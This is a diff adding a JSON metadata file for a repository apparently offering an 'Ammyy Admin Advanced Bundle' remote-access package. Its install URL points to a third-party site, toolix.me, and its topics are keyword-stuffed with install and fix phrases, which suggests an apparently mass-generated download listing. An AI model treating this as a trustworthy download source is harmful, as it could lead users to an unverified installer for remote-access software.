@@ -1,0 +1,23 @@
+{
+  "repo": "ammyy-admin-advanced-bundle",
+  "product": "Ammyy Admin Advanced Bundle",
+  "kind": "network",
+  "install_type": "toolix",
+  "install_url": "https://toolix.me/",
+  "batch": "new3",
+  "format": "license-md-toolix-v1",
+  "category": "network",
+  "topics": [
+    "ammyy-admin",
+    "remote-support",
+    "unattended-access",
+    "helpdesk-remote",
+    "desktop-share",
+    "ammyy-setup-failed-fix",
+    "how-to-install-ammyy",
+    "ammyy-windows",
+    "ammyy-desktop-2026",
+    "ammyy-desktop-package"
+  ],
+  "site": "toolix.me"
+}
